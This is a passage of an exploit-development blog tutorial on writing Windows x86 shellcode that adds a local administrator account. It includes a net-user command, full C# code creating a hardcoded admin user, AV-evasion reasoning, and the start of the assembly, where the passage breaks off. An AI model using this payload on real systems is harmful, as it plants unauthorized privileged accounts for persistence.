---
title: Shellcode – Windows/x86 – Create Administrator User – Dynamic PEB & EDT
url: https://xavibel.com/2023/01/18/shellcode-windows-x86-create-administrator-user-dynamic-peb-edt/
source: Happy Hacking!
date: 2023-01-19
fetch_date: 2025-10-04T04:17:42.080609
---

# Shellcode – Windows/x86 – Create Administrator User – Dynamic PEB & EDT

[Skip to content](#content)

[Happy Hacking!](https://xavibel.com/)

Exploit Dev & Web App Security

![Happy Hacking!](https://xavibel.com/wp-content/uploads/2018/10/cropped-Neo_room-4.jpg)

* [Home](https://xavibel.com/)
* [About me](https://xavibel.com/about-me/)

[← Creating your own AMSI Bypass using Powershell Reflection Technique](https://xavibel.com/2022/11/03/creating-your-own-amsi-bypass-using-powershell-reflection-technique/)

[CTF Binary Exploitation – Cyber Apocalypse 2024: Hacker Royale – Pet Companion →](https://xavibel.com/2024/03/17/ctf-binary-exploitation-cyber-apocalypse-2024-hacker-royale-pet-companion/)

# Shellcode – Windows/x86 – Create Administrator User – Dynamic PEB & EDT

Posted on [January 18, 2023](https://xavibel.com/2023/01/18/shellcode-windows-x86-create-administrator-user-dynamic-peb-edt/ "12:42 pm") by [Xavi](https://xavibel.com/author/xavi/ "View all posts by Xavi")

Hello everyone,

Recently I’ve been learning about Windows x86 shellcoding and I decided to write a shellcode by my own.

My idea was to write a shellcode that creates a new user and make it local administrator. You can find the final version of the shellcode here:

<https://www.exploit-db.com/shellcodes/51208>

In this blog post I will explain how I created this shellcode step by step.

Since I had only experience writing linux shellcode, I thought that I just needed to identify the correct syscall numbers and make the proper calls, but after some research I realized that if I do it that way, the shellcode won’t work in other OS versions.

First of all, let’s cover how to make portable shellcodes in Windows.

## Shellcoding in Windows – System Calls

The main problem here is that Windows system call numbers may vary between OS versions.

To see this, we can go to the following webpage:
https://j00ru.vexillium.org/syscalls/nt/32/

Every row is the result for a different system call, as you can see it changes a between OS versions:

![](https://xavibel.com/wp-content/uploads/2023/01/01.png)

To avoid hardcoding the system calls numbers and prevent the shellcode being OS version dependent, there are different techniques like the following ones:

* Locate the Process Environmental Block (PEB) structure.
* Structured Exception Handler (SEH)
* “Top Stack” method

For this blog post I will use the PEB technique, the other two are less portable and may not work on modern versions of Windows.

Is not the purpose of this post to cover the theory behind this technique, you can read all the details here:
<https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode>

Once we located the PEB, we will need to resolve symbols from kernel32.dll (and other DLLs), to do that we will use the Export Directory Table method.
<https://mohamed-fakroud.gitbook.io/red-teamings-dojo/shellcoding/leveraging-from-pe-parsing-technique-to-write-x86-shellcode>

## Win32 API calls

Another topic that was important to think about before starting coding was the different options that I had to make the shellcode work:

**Option 1)** Execute a new process and execute the following command:

```
cmd.exe /c "net user xavi /add && net localgroup administrators xavi /add"
```

**Option 2)** Use Win32 API calls
<https://learn.microsoft.com/en-us/windows/win32/api/_netmgmt/>

* NetUserAdd
  <https://www.pinvoke.net/default.aspx/netapi32/NetUserAdd.html>
* NetLocalGroupAddMembers
  <https://www.pinvoke.net/default.aspx/netapi32/NetLocalGroupAddMembers.html>

The option 2 from my point of view is better in order to avoid AV detections.

## C# Code

Before implementing this in assembly, I wanted to write it in C#, the idea was to try to understand how to call this two functions:

* NetUserAdd
* NetLocalGroupAddMembers

This is the implementation:

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Linq;
using BOOL = System.Boolean;
using DWORD = System.UInt32;
using LPWSTR = System.String;
using NET_API_STATUS = System.UInt32;

namespace adduser
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct USER_INFO_1
    {
        [MarshalAs(UnmanagedType.LPWStr)] public string sUsername;
        [MarshalAs(UnmanagedType.LPWStr)] public string sPassword;
        public uint uiPasswordAge;
        public uint uiPriv;
        [MarshalAs(UnmanagedType.LPWStr)] public string sHome_Dir;
        [MarshalAs(UnmanagedType.LPWStr)] public string sComment;
        public uint uiFlags;
        [MarshalAs(UnmanagedType.LPWStr)] public string sScript_Path;
    }

    struct LOCALGROUP_MEMBERS_INFO_3
    {
        [MarshalAs(UnmanagedType.LPWStr)]
        public string Domain;
    }
    internal class Program
    {
        // Constants
        //uiPriv
        const uint USER_PRIV_GUEST = 0;
        const uint USER_PRIV_USER = 1;
        const uint USER_PRIV_ADMIN = 2;

        //uiFlags (flags)
        const uint UF_DONT_EXPIRE_PASSWD = 0x10000;
        const uint UF_MNS_LOGON_ACCOUNT = 0x20000;
        const uint UF_SMARTCARD_REQUIRED = 0x40000;
        const uint UF_TRUSTED_FOR_DELEGATION = 0x80000;
        const uint UF_NOT_DELEGATED = 0x100000;
        const uint UF_USE_DES_KEY_ONLY = 0x200000;
        const uint UF_DONT_REQUIRE_PREAUTH = 0x400000;
        const uint UF_PASSWORD_EXPIRED = 0x800000;
        const uint UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 0x1000000;
        const uint UF_NO_AUTH_DATA_REQUIRED = 0x2000000;
        const uint UF_PARTIAL_SECRETS_ACCOUNT = 0x4000000;
        const uint UF_USE_AES_KEYS = 0x8000000;

        //uiFlags (choice)
        const uint UF_TEMP_DUPLICATE_ACCOUNT = 0x0100;
        const uint UF_NORMAL_ACCOUNT = 0x0200;
        const uint UF_INTERDOMAIN_TRUST_ACCOUNT = 0x0800;
        const uint UF_WORKSTATION_TRUST_ACCOUNT = 0x1000;
        const uint UF_SERVER_TRUST_ACCOUNT = 0x2000;

        // NetUserAdd - NETAPI32.DLL
        [DllImport("netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern int NetUserAdd([MarshalAs(UnmanagedType.LPWStr)] string servername, UInt32 level, IntPtr userInfo, out UInt32 parm_err);

        // NetLocalGroupAddMembers - NETAPI32.DLL
        [DllImport("NetApi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern Int32 NetLocalGroupAddMembers(string servername, string groupname, UInt32 level, ref LOCALGROUP_MEMBERS_INFO_3 buf, UInt32 totalentries);
        static void Main(string[] args)
        {
            // Add new local user
            UInt32 parm_err = 0;

            USER_INFO_1 ui = new USER_INFO_1();
            IntPtr bufptr = Marshal.AllocHGlobal(Marshal.SizeOf(ui));

            ui.sUsername = "revil";
            ui.sPassword = "Summer12345!";
            ui.uiPasswordAge = 0;
            ui.uiPriv = USER_PRIV_USER;
            ui.sHome_Dir = "";
            ui.sComment = "";
            ui.uiFlags = UF_NORMAL_ACCOUNT;
            ui.sScript_Path = "";

            Marshal.StructureToPtr(ui, bufptr, false);
            NetUserAdd(null, 1, bufptr, out parm_err);

            // Add the user to local administrators
            LOCALGROUP_MEMBERS_INFO_3 group;
            group.Domain = "revil";

            NetLocalGroupAddMembers(null, "administrators", 3, ref group, 1);

        }
    }
}
```

## Start writing the shellcode

The following part of the shellcode is the main skeleton, I won’t explain it, because contains the implementation to locate kernel32, the load process, and the symbols location that I explained before.

```
start:
    mov ebp, esp                   ;
    add esp, 0xfffff9f0            ; To avoid null bytes

find_kernel32:
    xor ecx, ecx                   ; ECX = 0
    mov esi,fs:[ecx+30h]           ; ESI = &(PEB) ([FS:0x30])
    mov esi,[esi+0Ch]              ; ESI = PEB->Ldr
    mov esi,[esi+1Ch]              ; ...